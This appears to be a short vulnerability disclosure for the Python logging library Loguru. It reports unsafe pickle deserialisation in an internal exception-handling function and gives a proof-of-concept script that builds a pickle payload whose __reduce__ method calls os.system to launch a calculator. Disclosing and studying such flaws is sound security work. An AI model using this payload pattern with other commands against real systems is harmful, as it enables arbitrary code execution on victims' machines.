# Description
Loguru is a library which aims to bring enjoyable logging in Python.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip install loguru')
from loguru import _recattrs
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
_recattrs.RecordException._from_pickled_value(dumps,dumps,dumps)
```
* `pip3 install loguru`
* `python3 exploit.py`
